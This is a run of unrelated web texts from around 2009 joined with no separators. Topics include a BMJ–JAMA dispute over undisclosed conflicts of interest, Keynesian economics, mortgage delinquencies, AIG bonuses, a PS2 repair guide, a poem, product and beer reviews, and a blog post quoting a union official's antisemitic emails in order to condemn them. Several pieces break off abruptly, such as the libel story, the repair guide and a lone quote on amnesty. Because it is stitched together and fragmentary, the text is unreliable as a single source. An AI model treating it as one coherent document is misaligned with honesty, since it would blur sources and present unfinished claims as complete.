We submitted it to the British Medical Journal ( BMJ ) , who agreed to publish it as a Rapid Response on their website .
Months later , before publishing the BMJ letter , I called JAMA editorial staff twice to talk about the upcoming piece , and I also sent an email .
Given the topic of the letter , I wanted to give JAMA an opportunity to correct any factual errors .
No one from JAMA responded to my phone calls or email .
The letter underwent legal review at BMJ and was approved for publication .
We then published what we thought of as a fairly unremarkable letter primarily of interest to researchers who study COI .
The immediate , aggressive response from JAMA has been well documented .
Threatening phone calls , personal attacks , and emails were accompanied by demands that we retract the entire BMJ letter .
Our letter was published without any negative commentary regarding JAMA itself , and included the following statement :
≥ We are fully aware that JAMA is concerned about conflicts of interest and has taken a leading role in promoting policies to benefit the medical community .
We are pleased to report that we learned at the end of business on Thursday ( 3/5/09 ) that the JAMA Editorial Staff has looked into this matter and will be discussing it in the forthcoming March 11 issue . ≤
Our letter did not attack JAMA and , if anything , presents the facts of the matter flatly .
JAMA continued to ask that the entire piece be retracted .
We were stunned by the continued , heated reaction from JAMA , and were concerned that we might have inadvertently made an error of fact in our letter .
I made the following offer repeatedly : Please tell me what we have written that is factually incorrect , and if we have made a mistake or misinterpretation , we will retract the entire piece and issue a public apology .
No factual errors were ever pointed out .
I remain confused as to why JAMA felt they could demand that we retract an accurate letter .
Phone calls were followed by a scathing JAMA editorial which pinpoints my actions as the cause of the problem - with no mention of the culpability of the researchers who failed to disclose their COI , or the fact that the undisclosed COI was unearthed by a 5 - minute Google search .
JAMA now insists that it was inappropriate to disclose the COI while they were conducting an investigation .
This is curious , for several reasons .
First , their investigation was complete by the time our letter was published .
Second , the undisclosed COI information contained in the article is publicly available on the Internet ( again , here , here , here , here , and here ) .
JAMA has never clarified how the re-publication of publicly available information after the fact could interfere with a completed investigation .
This investigation , which took five months , resulted in a short correction published in JAMA , along with a letter from the authors apologizing for their lapse of memory resulting in undisclosed COI .
JAMA has claimed that the result of their investigation was more comprehensive than our BMJ piece .
I only ask that readers actually compare the material published in JAMA with that published in BMJ .
The material published in JAMA does not include any analysis of the context or potential implications .
I believe our BMJ letter presents a more complete ( and troubling ) story .
Importantly , I am under the impression that JAMA objected not to the timing of the publication of the letter , but to us publishing the letter at all .
In their most recent editorial , JAMA seems to assert that they have some right to control the publication of publicly available information outside their own medical journal .
I do not believe they have any such right .
It would seem to be an infringement of academic freedom to threaten academics who analyze publicly stored information .
This information was available to anyone with access to the Internet .
The view that JAMA should control such information is anachronistic at best .
At worse , it is a reflection of a scientifically and ethically inappropriate effort to suppress the free exchange of information , which is at the heart of productive scientific discourse .
The implications of the JAMAπs reaction to our letter are significant .
For instance , the pharmaceutical industry is often criticized for their impact on evidence - based medicine .
In the past , I have criticized direct - to - consumer advertising of psychiatric medications , which is not helpful to Big Pharma .
However , I have never been telephoned or threatened by representatives from Big Pharma .
In contrast to my experience with JAMA , any exchanges have been civil and appropriate .
The claim that JAMA can control the flow of information in the public record should be considered by bioethicists and other academics who study the process of medical research and publication .
In my opinion , this claim has shifted this issue markedly .
What began as a short ( and potentially obscure ) letter about undisclosed COI has now led to questions about the limits of institutional authority in the medical publishing industry , the extent of academic freedom , and even the role of the First Amendment .
Competing Interests : None .

More than half a century after his death , British economist John Maynard Keynes is back in vogue .
Can Keynesian economics pull the world out of its slump ?
Who was John Maynard Keynes ?
The 20th century ’s guiding light of liberal economic theory .
Born in 1883 , Keynes was educated at Eton and Cambridge , and became a prolific writer on subjects ranging from philosophy to probability .
He joined the British Treasury during World War I , representing it in negotiations in Versailles over the treaty that ended the war .
His experience in Versailles led him to write The Economic Consequences of the Peace , in which he condemned the onerous reparations imposed on Germany and sagely predicted the ruin that loomed ahead for Europe .
Such unconventional views left him out of political favor for much of the 1920s .
But the market crash of 1929 increased demand for his theories — and counsel — on both sides of the Atlantic .
In 1936 , he published his magnum opus , The General Theory of Employment , Interest , and Money , which for decades exerted a profound influence on economic thinking and practice .
What was the core of his economic theory ?
Disputing the classical free - market belief in an “ invisible hand ” that guides economies in a natural cycle , Keynes viewed recessions and depressions as symptoms of economic distress that must be treated .
He also challenged the prevailing view that governments should always strive to balance budgets .
Keynes said the proper response to economic slowdowns was to boost demand in the marketplace , and if the private sector was not investing sufficiently to create demand — as was the case throughout the 1930s — then government should fill the void by spending .
It mattered not whether the government was building trains or pyramids — the point was to create jobs so citizens would have more money in their pockets , which would increase demand for goods and services and propel the economy forward .
Did this theory get a real - world test ?
Yes .
It was called the Great Depression .
With the country ’s economy in collapse , President Roosevelt followed Keynesian principles by spending heavily on public - works projects .
In response , unemployment rates slowly declined through the 1930s , and the economy began to revive .
But it was n’t until the largest public - spending program of all — World War II — that the Great Depression came to an end .
After the war , most mainstream economists were more or less “ Keynesians . ”
Time magazine wrote in 1965 that Keynes ’ ideas had become so widely accepted “ that they constitute both the new orthodoxy in the universities and the touchstone of economic management in Washington . ”
Why did Keynes fall out of favor ?
In the 1970s , global economic distress defied a lot of Keynesian thinking .
Keynesian models projected that the ills of inflation and unemployment had an inverse relationship — if one was high , the other would be low .
Government could supposedly keep both at modest levels by adjusting both monetary policy ( interest rates and the money supply ) and fiscal policy ( taxation and spending ) .
But in the 1970s , unemployment in the U.S. hit 8 percent and was accompanied by 16 percent inflation .
Inflation in the U.K. and Japan rose even higher , and out - of - control government spending was blamed .
Keynesian theory lost its mojo , replaced by the conservative policies identified with economist Milton Friedman .
While Keynes emphasized demand , Friedman stressed adjustment of interest rates and the money supply as the primary lever of economic policy .
Rather than trying to micromanage the economy , Friedman said governments should lower taxes , lower interest rates , and get out of the way , letting the pursuit of wealth drive a return to economic health .
Why is Keynes suddenly back ?
Because of the mess we ’re now in .
In the current economic crisis , monetary policy has been pushed to its limit .
The interest rate charged to lenders is near zero , but lending remains stalled and economic activity has plummeted along with employment .
With no tools left in the monetarist kit , many economists favor a government boost to aggregate demand — just as Keynes would have advised .
That ’s the idea behind the $ 787 billion stimulus package .
How will the stimulus work ?
It will spend billions on public - works projects , health care , education , law enforcement , and other programs in an effort to create jobs and put money in people ’s pockets .
The key goal is to goose consumer spending and counter the effect that Keynes called “ the paradox of thrift . ”
If everyone tries to save money in an economic downturn , the reduction in spending only accelerates the spiral .
With a burst of public spending , the White House hopes to break the cycle and restore confidence , the key psychological factor that Keynes called the “ animal spirits . ”
Will it succeed ?
Nobody knows .
Economics can be mystifying .
Back in the Great Depression , Keynes said , “ We have involved ourselves in a colossal muddle , having blundered in the control of a delicate machine , the working of which we do not understand . ”
Eighty years later , the experts ’ collective understanding of economies is greater than it was in Keynes ’ hour of despair .
But while the White House can point to broad support for the stimulus among economists , not everyone thinks it will work .
Critics contend that government spending is inherently wasteful and that the resulting deficits will suppress private investment by driving up interest rates .
They prefer balanced budgets , and their lower risk of inflation , saying that such sound policies will lead to a recovery — perhaps not immediately , but in the long run .
To such critics , Keynes once famously said , “ In the long run , we are all dead . ”
Keynes ’ bohemian side
Keynes was at home among the rarefied Bloomsbury set , the collection of artists and intellectuals that cohered in pre–WWI London .
He appreciated Bloomsbury ’s disdain for convention — he had a lengthy and fairly open homosexual affair with painter Duncan Grant before the war .
But despite his bohemian tendencies , he found no attraction in radical politics .
Squarely labeling himself a “ bourgeois economist , ” he used his financial acumen to amass a fortune , including one of the world ’s great collections of 20th - century art .
Keynes married a popular Russian ballerina , Lydia Lopokova , in 1925 ; the couple had no children .
As a don at Cambridge , he influenced a generation of young intellectuals , establishing himself as one of the most formidable minds of the century .
“ Every time I argued with Keynes , ” said philosopher Bertrand Russell , “ I felt that I took my life in my hands and I seldom emerged without feeling something of a fool . ”
Ca n't say I 'd ever heard of Highland Park 's Hiram Walker Royall till last night , when I stumbled across this piece from the First Amendment Center concerning the developer 's October '08 libel lawsuit , brought about because Royall 's furious over the contents of the well - reviewed 2007 book Bulldozed : " Kelo , " Eminent Domain and the American Lust for Land .
And what 's the book about ?
Says the FAC , the tome deals with Royall 's " efforts to get Freeport , Texas , to use eminent - domain laws to enable him to build a marina where a shrimp business has existed for generations . "
( There 's more here , from 2005 . )
But to be honest , well , maybe it's a bad idea to even mention this .
Why come ?
Well , from the Institute for Justice 's recap of the case :
When the victims of his eminent domain abuse in Freeport , Texas , complained , Royall sued them for defamation .
When an investigative journalist wrote a book exposing the project , he sued her , as well as her publisher , for defamation .
He even sued a prominent law professor who wrote a blurb for the book 's dust jacket .
When someone reviewed the book , he sued him .
When two newspapers published that review , he sued them .
If you 've ever been to a paintball fight , you know that the guns are heavy , the paint is really messy and does n't smell very good , and that the paintballs hurt when they hit you .
And if you 've ever wanted to bring your kids to play , you know that most places have a minimum age of 11 or 12 , for all of those reasons ( plus liability insurance , no doubt ) .
Now there 's a safer , lighter , much less - messy version of paintball — only it does n't use paint in any form .
It 's called WipeOut , and it comes as set of two guns , each of which holds and can shoot foam - tipped darts that leave a smear of chalk dust when they hit .
The kit also comes with two pairs of safety glasses , because of course chalk dust in the eye would not be much fun .
The guns are spring - loaded , so their range is considerably more limited than paintball guns , but as a parent I 'm not sure that 's a bad thing .
I think this is a great idea all around .
Chalk dust cleans up easily , and the darts seem to be essentially Nerf - plus - chalk , so there 's little to object to about them .
They 've been safety - tested for children age eight and up , though I 'd imagine most kids six and up would be able to handle the guns without much difficulty .
They 're very obviously toys by their appearance , so I look at them the same way I do water guns : not quite gun- like enough to make me nervous about letting my kids play with them .
WipeOut chalk dust guns are available online at several merchants , though I was n't able to find out about their availability in stores .
The two - gun kit retails for $ 39.99 , and a six - dart refill pack retails for $ 10.99 .
If I decide to get them for my kids , I will definitely post a review shortly thereafter .

NEW YORK ( CNNMoney.com ) --
More than 11 % of all mortgages are either delinquent or in foreclosure , according to an industry report released Thursday .
The percentage of borrowers at least one month behind in their mortgage payments - but not in foreclosure - rose to nearly 8 % during the fourth quarter of 2008 , according to the National Delinquency Report from the Mortgage Bankers Association ( MBA ) .
This is the highest rate of delinquency ever recorded by the survey , which began in 1972 , and reflects a record 13 % jump compared to the third quarter .
" Subprime ARM loans and prime ARM loans , which include Alt - A and pay - option ARMs , continue to dominate the delinquency numbers , " Jay Brinkmann , chief economist for the MBA , said in a prepared statement .
" Nationwide , 48 % of subprime ARMs were at least one payment past due , and in Florida over 60 % of subprime ARMs were at least one payment past due . "
The number of homes in the foreclosure process rose to 3.3 % , an increase of 0.33 percentage points from the quarter before and up 1.26 percentage points from a year earlier .
That represents nearly 1.5 million homes at risk of sliding all the way through foreclosure .
Combined , the number of delinquencies and loans in foreclosure came to 11.18 % , the highest ever recorded by the MBA .
Delaying tactics
And even though the number of loans entering into the foreclosure process remained steady , the number of loans stuck there was particularly high , according to Brinkmann .
" This is mainly attributable to various state and local moratoria on foreclosure sales , the Fannie Mae and Freddie Mac halt on foreclosure sales announced in late November , a general reluctance by servicers to proceed with evictions in the last few weeks of December and a slowing down caused by an overburdened legal process in some areas , " he said .
Because of the moratoria , the number of loans very far past due - 90 days or more - jumped sharply to 3 % from 2.2 % a quarter earlier .
In the past , many of those loans would have been cleared out of the system by lenders completing the foreclosure process .
The Obama administration 's new foreclosure prevention program , which includes refinancing options and loan modifications , is another attempt to slow the rate of foreclosures .
The MBA report underscores the need for some foreclosure relief , according to Nicholas Retsinas , director of Harvard University 's Joint Center for Housing Studies .
" It raises the ante for the Obama plan , " he said .
" It justifies it , but at the same time it raises the question of whether it 's sufficient to solve the problem . "
Still , it is unclear how helpful the plan will be , according to Mike Larson , a real estate analyst with Weiss Research .
" Previous foreclosure prevention efforts have had a spotty record , " he said , " with many loan modifications simply postponing the inevitable . "
Even though delinquencies are still driven by problems with non-traditional mortgage loans , Brinkmann said more fundamental , historic causes of foreclosure are also making an impact .
" The delinquency rates continue to climb across the board for prime fixed - rate and subprime fixed - rate loans - loans whose performance is driven by the loss of jobs or income rather than changes in payments , " he said .
Five states - California , Nevada , Arizona , Florida and Michigan - once again dominated delinquency statistics during the quarter , but the number of loans 90 days late or more also increased significantly in New York , Louisiana , Texas , Georgia and Mississippi .
Outlook
According to Brinkmann , the nation is in for many more months of problem delinquencies .
Historically late payments follow a pattern that begins with the economy slowing , which leads to job losses and then to increased delinquencies .
" It 's difficult to deal with mortgage issues separately , " he said .
He does not project a pick up in the economy until the end of the year , followed by an increase in employment late in 2010 and improvement in delinquency rates some time after that .
Retsinas pointed out that this foreclosure cycle is very different .
Most delinquency increases in the past were kicked off by job losses .
Not this time , which could have implications for the recovery .
" The problems started before the economy began failing , " he said .
" Now the failing economy makes the housing problems even more serious . "

Change in skin color for the humans who migrated from Africa to Europe was caused by the mutation of one amino acid in a single gene , Penn State University researchers said .
" The mutation explains part of the lingering mystery of how human skin colors evolved during the last 50,000 years as modern humans migrated across the world after leaving Africa .
This really calls into question our ideas about race , " said Mark Shriver , one of the study 's authors .
Previous studies on pigmentation have identified more than 100 genes involved in pigment production .
Alterations in some of these genes are associated with disorders such as albinism .
However , most of the genes responsible for normal differences in skin pigmentation remained unknown .
The gene , SLC24A5 , identified by Keith Cheng and his team , had not been suspected to be involved in pigmentation .
The study was based on the zebrafish , used in genetics because of its similarities with the human genes .
In people of European descent , the melanosomes are fewer , smaller , and lighter than those from people of West African ancestry .
Researchers discovered that a certain type of zebrafish , called " golden " , also had fewer , smaller , and less heavily pigmented melanosomes than normal fish .
By adding the gene from the normal fish to the golden one , they noticed a change in pigmentation .

I do n't usually get to say that reality - based medicine won a round with so - called alternative medicines , but today we have two such wins !
One is simply fantastic : last week , I posted about the Australian Skeptics open letter to pharmacists , taking them to task about promoting such nonsense as homeopathy and ear candling .
I found out today their letter has had a very positive effect : on Pharmedia News Reports ( " Commentary on Media Reports Worldwide that Affect Pharmacy " ) , their editor responded to the Australian ad , saying " we recommend that all practicing pharmacists evaluate what the Skeptics have to say , and if any part of your daily practice needs reviewing , then please take the time to undertake a proper adjustment . "
Yay !
And it gets better :
The following extracts were collated from the Pharmacy Board of NSW bulletins by Gerard McInerny ( president ) .
Alternative medical practice or therapies , such as iridology , aromatherapy , reflexology , homeopathy and similar " natural " approaches to health care have apparently found a place in the community , but the Board can see little or no place for them in the practice of pharmacy .
Regardless of any pharmacist 's other heath care interests , no pharmacist may ever disregard their standing in the community as a provider of primary health care ...
Because a recommendation by any pharmacist for a therapy or medicine gives that therapy or medicine special credibility , it is essential that the recommendation is soundly and scientifically based .
That 's fantastic , and great to hear .
Congrats to the Australian Skeptics !
The second win for real medicine was in the UK .
Prince Charles is a noted supporter of alternative medicine , and has a company called Duchy Originals .
This company makes some sketchy claims about their products detoxifying the body ( something that your body does just fine all by its lonesome , just look up what the liver and kidneys do ) .
A consumer complained about these ads , and lookee what happened :
After seven weeks of deliberation the Medicines and Healthcare Products Regulatory Agency , the licensing body responsible for assessing herbal medicines for safety , upheld the complaint prompting the company to change the wording of the adverts and remove the previous claims .
Yay again !
Now , the company of course has claimed that they say their product is a " supplement " , and not a medicine or a cure .
Lots of sham companies in the US make this same claim about their product , too .
They have commercials that go on and on about what their product does to make you feel better , solving this body problem , fixing that condition .
But then , in teeny tiny letters it says " This product not evaluated by the Food and Drug Administration " , which essentially means they 're lying .
It 's incredible to me that some company can create pills that people can take internally , claim they 'll make you bigger or smaller or faster or pain - free or detoxified , and these claims are not tested at all .
And it 's not just that these pills almost certainly do n't do what they claim ; they can also react to other pills you may be taking ( science - based or not ) and cause grievous health problems , such as , for example , death .
So I 'm thrilled that real science is making headway .
There 's a long long way to go , but this is good progress .

" This food safety thing is a huge can of worms , and there is a lot of misinformation being spread around .
In the wake of the salmonella peanut scandal , there are several bills being introduced that attempt to address the gaps in the food safety net .
Some of them call for more draconian measures than others and could pose onerous regulations on small family farmers .
The main myths that I have seen are that these bills are being pushed by Monsanto , that they will be passed by Congress in the next two weeks , and that they will outlaw backyard gardens and organic farms .
None of this is true .
Monsanto has nothing to do with these bills .
Period .
I 've definitely been getting these action alerts for more than two weeks , and so far the bills have n't even been heard in a Congressional committee .
The bills also contain quite a few provisions that will regulate the pharmaceutical industry ( so I 've heard ) which will slow them down tremendously .
Also , it 's one of those things where a bunch of bills get introduced but what will likely happen is that pieces of each bill will be put into one of them , likely the Dingell bill , HR 759 . "
[ And , to the concern that organic gardening and backyard gardening will be outlawed ] : " The Obamas are about to put an organic garden on their lawn .
Congress just gave an historical increase to organic farming programs in the last farm bill .
Why would they then turn around and outlaw organic farming ?
Rep Delauro , who introduced one of the bills ( HR 875 ) has been vilified as one of the perpetrators in this whole thing , but she is actually a very reasonable , intelligent , and progressive member of Congress who has been very supportive of local food and family farming .
Last week , a delegation from the National Sustainable Agriculture Coalition ( of which OFRF is a member ) met with her staff and were told that it was by no means her intention to introduce any bill that would turn the tide on local / organic / family farm initiatives and efforts .
She also happens to be chair of a very powerful subcommittee , the Agriculture Subcommittee in the Appropriations Committee , and therefore has the ability to really influence what actually goes down the pike with these two bills .
In terms of resources on what the bills do and how they are problematic , I suggest you check out the blog , La Vida Locavore http://www.lavidalocavore.org/.
She has some good takes on it .
Also , NOFA www.nofa.org and Food and Water Watch http://www.foodandwaterwatch.
org / food / foodsafety / background - on-h-r-875 have a good take on the Food Safety issues .
Also , read this from the last NSAC Weekly alert , which has a link to this write - up in " The Hill " : http://thehill.com/op-eds/ agriculture--food-safety-2009- 03-19.html Food Safety Buzz : Amid the chatter on the blogs and foodie listserves in the wake of the introduction of several food safety bills this year in Congress , the Friday , March 20 , 2009 edition of The Hill ( a Capitol Hill rag read by staffers and legislators ) contains a 5 - page special section on Agriculture and Food Safety .
The special section includes a short piece by Rep. Rosa DeLauro ( D - CT ) outlining the food safety bill she recently introduced to fundamentally restructure the food safety bureaucracy by establishing a new Food Safety Administration within the Department of Health and Human Service .
Another piece , by Sen. Herb Kohl ( D - WI ) draws the connection between food safety and food imports .
Sen .
Thad Cochran ( R - MS ) argues that food safety concerns can be addressed with improvements to the existing system and more prudent use of current funding , while House Agriculture Chair Collin Peterson ( D - MN ) notes his intention to conduct food safety oversight hearings regarding both FDA and USDA .

Watch me , I ’m running , watch me , I ’m dancing , I ’m air ;
the building I used to live in has been razed and I ’m skipping ,
hopping , two - footedly leaping across the blocks , bricks ,
slabs of concrete , plaster , and other unnameable junk . . .
Or nameable , really , if you look at the wreckage closely . . .
Here , for instance , this shattered I - beam is the Bible ,
and this chunk of mortar ?
Plato , the mortar of mind ,
also in pieces , in pieces in me , anyway , in my mind . . .
Aristotle and Nietzsche , Freud and Camus and Buber ,
and Christ , even , that year of reading “ Paradise Lost , ”
when I thought ,
Hell , why not ?
but that fractured , too . . .
Kierkegaard , Hegel , and Kant , and Goffman and Marx ,
all heaped in the foundation , and I ’ve sped through so often
that now I have it by heart , can run , dance , be air ,
not think of the spew of intellectual dust I scuffed up
when in my barely broken - in boots I first clumped through
the sanctums of Buddhism , Taoism , Zen , and the Areopagite ,
even , whose entire text I typed out — my god , why ? —
I did n’t care , I just kept bumping my head on the lintels ,
Einstein , the Gnostics , Kabbalah , Saint This and Saint That . . .
Watch me again now , because I ’m not alone in my dancing ,
my being air , I ’m with my poets , my Rilke , my Yeats ,
we ’re leaping together through the debris , a jumble of wrack ,
but my Keats floats across it , my Herbert and Donne ,
my Kinnell , my Bishop and Blake are soaring across it ,
my Frost , Baudelaire , my Dickinson , Lowell and Larkin ,
and my giants , my Whitman , my Shakespeare , my Dante
and Homer ; they were the steel , though scouring as I was
the savants and sages half the time I hardly knew it . . .
But Vallejo was there all along , and my Sidney and Shelley ,
my Coleridge and Hopkins , there all along with their music ,
which is why I can whirl through the rubble of everything else ,
the philosophizing and theories , the thesis and anti- and syn- ,
all I believed must be what meanings were made of ,
when really it was the singing , the choiring , the cadence ,
the lull of the vowels , the chromatical consonant clatter . . .
Watch me again , I have n’t landed , I ’m hovering here
over the fragments , the remnants , the splinters and shards ;
my poets are with me , my soarers , my skimmers , my skaters ,
aloft on their song in the ruins , their jubilant song of the ruins .
Ever gotten those annoying Disc Read Error messages on your Playstation 2 ?
If you have , I 'll bet the first time you saw one was on the 31st day you 've had it , after the Sony 30 - day warranty expired .
If you 're real lucky , your PS2 might last two or even three years ; eventually this error will hunt down your PS2 and settle down there .
If it only affects you some of the time ?
you might be able to play some DVD movies , but your favorite one never loads , or you can only play PSone games and not silver - colored PS2 games ?
then chances are it's not a serious error and only requires minor adjustments to your PS2 .
Since it is out of warranty , there 's little risk in opening it up and trying to fix it yourself before paying to send it back to Sony 's repair center .
The following guide shows you how to get the PS2 open , clean it out , make your adjustments , and put it back together without any hassles .
Before we begin , I 'd just like to say that if your PS2 is under warranty , get this taken care of by Sony .
It 's not worth voiding your warranty if you can survive without it for a week or so .
If your PS2 can't read anything at all , cross your fingers and read on , but you may have a more serious issue than we can fix .
I am using a model SCPH - 30001 Playstation 2 , with a U serial number .
Newer models have different heatsinks and even a different chip layout on the motherboard .
Some instructions may vary or not apply for other models .
My apologies to modem users , but I 'm going to throw in a lot of pictures .
You 'll find plenty of other PS2 repair guides , but most have blurry pictures , pictures taken from across the room , or none at all .
My aim is to show you every little part you have to deal with , so there 's no confusion .
Remember , spare parts are not your friend !
We 're only going to need a few tools for this .
Grab your PS2 , a normal - size Phillips and a flathead screwdriver , a small or jeweler 's size Phillips screwdriver , a can of compressed air , and one each of ( if you own any ) : a DVD , a PSone game , a silver PS2 game , and a blue PS2 game ( namely Contra : Shattered Soldier ) .
I 've chosen Army of Darkness , Final Fantasy Tactics , GTA : Vice City , and Contra .
To my knowledge , there is only a handful of blue games , so if you do n't have one there 's no need to worry .
During the repair of your Playstation 2 , we 'll be taking the device apart .
Most of the supports will be taken out , so be careful you do n't bend or break any of the connectors on the various ports or internally .
We 'll also be taking apart the loading tray .
This includes a Class 1 laser , which can blind you .
The easiest precaution is to make sure your PS2 is left off when the disc tray is open .
By the time you 're through with this article , all of the above should work in your PS2 , with the exception of the blue PS2 game .
For some reason , Konami decided to find the only color the PS2 has a hard time dealing with and throwing one of the best games on it .
Some people have never had a problem with this game , other people have never been able to load it .
The best we 're hoping for is that we can get it to load at least 10 % of the time .
More on that later .
To begin with , remove any add - ons you might have for your Playstation 2 , like the Network Adaptor .
They 'll just get in the way .
Flip the Playstation 2 upside down and remove all the rubber feet and square tabs .
Get the edge of the flathead screwdriver or a knife underneath them to pop them out .
I 've circled them on the picture below ?
4 rubber feet and 6 square tabs .
There 's a few you can leave on , but they might get in your way later .
The US bailed out AIG , in effect judging it too large to fail US insurance giant AIG paid out a total of $ 218 m ( £ 150 m ) in bonuses after accepting bail - out cash , according to a senior US official .
Documents obtained by Connecticut 's attorney general showed AIG 's payout was $ 53 m , or 32 % , more than was previously estimated .
Papers obtained by subpoena showed 73 people got more than $ 1 m each while five received more than $ 4 m .
The US rescued AIG with bail - out funds totalling $ 170bn since September 2008 .
But revelations about the size of bonus payments made by the organisation since the bail - out was agreed have sparked a furious reaction among US lawmakers and the general public .
' Distasteful '
For much of the week the total amount AIG paid out in bonuses was reported at $ 165 m .
But documents obtained by Richard Blumenthal , attorney general of Connecticut , now appear to raise that figure by some 32 % .
AIG : QUICK FACTS Founded in 1919 30 million US policy holders Operates in 130 countries Provides insurance to 100,000 companies and other entities
US lawmakers vote for bonus tax AIG chief asks for bonuses back Connecticut was among 19 states demanding that AIG reveal details of bonuses paid to executives , in an effort to begin recovering the funds .
AIG has made no comment on Mr Blumenthal 's findings .
But Mr Blumenthal said on Saturday that large bonuses were " showered like confetti " on AIG employees .
He said the newly - revealed number would " further fuel the justified anger and revulsion that people feel " , and he planned to ask AIG bosses to explain the discrepancies in bonus figures , AP reported .
" Unless the number can be explained , it will undercut any lingering rationale the company may have for these unjustified payments , " Mr Blumenthal said .
Earlier this week US President Barack Obama described the bonus payments as an " outrage " , before state legal figures and congressmen also weighed in .
Even AIG boss Edward Liddy - who underwent questioning by a congressional committee on the issue - has described them as " distasteful " .
Reports from the US say that AIG executives are now living in fear of a violent public backlash .
Protest bus
Many are reported to have received death threats and have been advised to take extra security precautions even in areas around their homes .
A group of about 40 protesters have hired a coach to tour executives ' homes in Connecticut - home to AIG 's main offices .
There they delivered letters highlighting the plight of ordinary families during the current recession .
The bonus money may not seem like a great deal to AIG or its top executives , the letter said , " but for Connecticut families struggling to make ends meet , for those of us who are losing our homes , losing our healthcare , losing our jobs , or our life savings , that much money could do tremendous good " .

" If you 've got a movie that is full of special effects , the squid is just another effect . "
With the man who helped him create , Alan Moore , dead set against the movie version , Dave Gibbons sure has been a trooper .
He 's been beating the drum for the movie for going on a year now , and was on hand to represent Warner Bros .
and the film at today 's panel .
Yes , it definitely is a little ridiculous that they could n't muster anyone who actually worked on the film to come to Comic Con , particularly with the movie 's release just weeks away .
But as you may notice , that 's becoming a theme of this year 's New York Con -- the movie studios seemingly can't be bothered .
Still , Gibbons was a gentleman , introducingfootage that many fans had n't seen yet ( but you would be familiar with had you been reading this site ) , and deflecting enthusiastic fan questions .
It 's worth noting how well the footage went over with the fans , who were especially thrilled by the opening credits , which take you through the entire history of the Minutemen and introduce you to an America full of real superheroes .
Though you barely see some of the most colorful early heroes , like the Silhouette and Hooded Justice , each of them gets their little moment that only the fans may manage to notice .
Plus I think the guys were particularly into the part where lesbian Silhouette strolls into Times Square at the end of World War II and kisses a lady nurse .
As for Gibbons , he spent the first 10 minutes of the panel fielding nothing but questions about the " giant squid " ending , and whether or not it really was changed in the movie .
He was n't really giving yes or no answers , but he basically admitted that the squid is gone , calling it the MacGuffin , or the gimmick .
See , nerds , Dave Gibbons cares less about the giant squid than you do !
Give it a rest !
He also made an interesting point about the squid 's role as a special effect in the story , and how that changes when it 's part of an effects - driven movie -- Gibbons also had some thoughts on the -ification of superhero movies , and howhad the same effect on comic books when it debuted in the 1980s .
Believe it or not , the man who helped create The Comedian does n't really want all superheroes to be dark .
Check out his response to that particular question , about howchanged comics , in the video below .
Over the past couple of weeks there has been some disturbing correspondence between Cosatu ’s International Relations secretary , Bonagini Masuku , and a number of the pro-Israel blogging community .
The correspondence was triggered by a comment placed by Bongani on this blog .
The comment read :
Hi guys , Bongani says hi to you all as we struggle to liberate Palestine from the racists , fascists and zionists who belong to the era of their Friend Hitler !
We must not apologise , every Zionist must be made to drink the bitter medicine they are feeding our broathers ( sic ) and sisters in Palestine .
We must target them , expose them and doo allthat ( sic ) is needed to subject them to pereptual suffering until they withdraw from the land of others and stop their savage attacks on human dignity .
Every Palestinian who suffers is a direct attck ( sic ) on all of us !
Following the posting of this comment Anthony Posner e-mailed Bongani in an attempt to understand the man behind this juvenile bigotry .
Bongani replied that his comment was not much worse than a previous comment left on this blog by a racist Zionist .
The comment in question was undoubtedly racist .
It was posted just before Shabbat came in and was left on the blog until after Shabbat .
That Saturday night , once I saw the offensive comment , I removed it .
Before I had the chance to remove the comment , however , Mohammed Desai from Wits PSC emailed the comment to a PSC mailing group , of which Bongani was a member , and portrayed it as the standard racism emanating from Zionist blogs .
By the time Bongani found this blog , the racist comment had already been removed .
Yet he still posted the above threatening comment .
Desai ’s circulation of the racist comment may have piqued Bongani ’s interest , but it in no way helped formulate his opinion .
Subsequent correspondence has revealed him for the unrepentantly blinkered and outrageously arrogant bigot that he is .
Since Bongani has repeatedly emailed his noxious opinions to us , I have decided to make it all public .
The link at the bottom of this post will allow you to read all of the correspondence with Bongani that I have been involved in .
Out of respect for the privacy of others , I have only included mine and Bongani 's emails .
Initially , I thought there was a certain soulful naiveté to Bongani , I even considered that he may be worth engaging on some ( low intellectual ) level .
I later changed my mind .
You can draw your own conclusions .
By the end of the correspondence Bongani was calling for the removal of almost all Jews from South Africa .
As the International Relations secretary of Cosatu , which is a member of the ruling ANC 's tripartite alliance , these views should concern us all .
Bongani writes :
In fact , all the people who deny that occupation is wrong must be encouraged to leave South Africa before they infect our society with much more racism .
He followed this up by saying , in his enthusiastic verbage , that " no pro-Israel Jews should ever consider South Africa to be their home ( sic ) " .
These are surely views that need to be challenged in the mainstream media and perhaps at the South African Human Rights Commission .
Finally , the racist comment posted on IAS was as disgusting as anything Bongani said .
This savage racism is not welcome here .
I guess it ’s the downside to having an open forum .
Despite this type of abus of our comments , we continue to see the value in open , and often unmoderated , forums where important issues can be debated .
Also , credit to Anthony Posner , whose engaging wit resulted in Bongani falling further and further down his very own twisted hole .

Update
Ben Cohen from Z - Word , copied in on almost all of the correspondence , has weighed in with some great analysis .
Get it here : Cosatu , Antisemitism , and my Inbox
Also see this roundup of the current turbulent situation written by Alana Pugh - Jones and published on Divaid Hirsch 's brilliant Engage Online : Hostility to Israel and antisemitism
He said : " This is obviously a policy for national government rather than the Mayor of London .
We are against an amnesty because we have seen that it does n't work in other parts of the world .
I wo n't lie , Arizona .
We 've had some great times drinking beer .
Who could forget our first trip to Four Peaks ?
Or the Mesa Strong Beer Festival just a few months ago ?
We 've had fun and that 's what makes this so hard to say : my beer gut belongs to another state .
That 's right , Arizona .
I , like many of my fellow Phoenicians , am a transplant .
It just so happens that I 'm from Texas and as such , my heart belongs to Shiner ; that delicious beer made from the Spoetzl Brewery in Shiner Texas .
Which is why I 've been sneaking bottles of Shiner 's Bohemian Black Lager between Kiltlifters .
I 'm sorry for the betrayal .
Initially I was attracted to Bohemian Black Lager 's tiny , black label , but when I opened my first bottle , I found so much more than superficial reasons for enjoying this beer .
So despite how hard it will be for me to get this off my chest , I 'm going to tell you the reasons why .
You deserve that much .
Tastes : like caramel riding that fine line between velvety goodness and a little too dark .
Bohemian Black Lager is a Schwarzbier or " black beer " that has much in common with British stouts only with a milder taste .
As the Bohemian slid across my tongue I could detect notes of coffee and chocolate from the dark roasted malts used in the brewing process .
The Spoetzl brewery uses Czech Saaz and Styrians Hops in the brewing process and I 'm glad because it 's delicious .
I got mine : on the down - low at AJ 's for $ 1.39 a bottle .
Surely there are tastier brews on the rack , but what this one lacks in flavor it makes up for in cold , hard cash .
I 'm not sure it 's possible to find a black lager this enjoyable for such a pittance .
When the honey moon period fades , that will keep me coming back .
